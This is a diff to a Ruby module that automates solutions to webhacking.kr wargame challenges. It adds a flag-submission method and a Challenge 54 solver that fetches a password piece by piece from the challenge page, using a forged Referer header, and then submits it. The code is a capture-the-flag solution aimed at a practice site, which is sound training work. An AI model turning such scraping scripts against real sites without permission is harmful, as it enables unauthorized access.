@@ -102,6 +102,15 @@ module WebhackingKR
       request.set_form_data(data)
       @client.request(request)
     end
+
+    def auth(flag)
+      response = post(
+        Wargame::QUERY_AUTH,
+        { 'flag' => flag }
+      )
+      response.body
+    end
+
   end
 
   ##
@@ -426,6 +435,35 @@ module WebhackingKR
       AMOUNT.times { get("#{PATH}#{QUERY}#{@wargame.user_id}") }
       response = get(PATH)
       check(response.body)
+    end
+  end
+
+  ##
+  # Challenge 54
+  class Challenge54 < ChallengeBase
+    CHALLENGE = 54
+
+    PATH = '/challenge/bonus-14/'
+    QUERY = '?m='
+
+    def exec
+      i = 0
+      password = String.new
+      log('Getting password')
+      loop do
+        response = get(
+          "#{PATH}#{QUERY}#{i}",
+          { 'Referer' => "#{Wargame::BASE_URI}#{PATH}" }
+        )
+        break if response.body.empty?
+
+        log(response.body)
+        password << response.body
+        i += 1
+      end
+
+      log("Password: #{password}")
+      check(auth(password))
     end
   end
 end
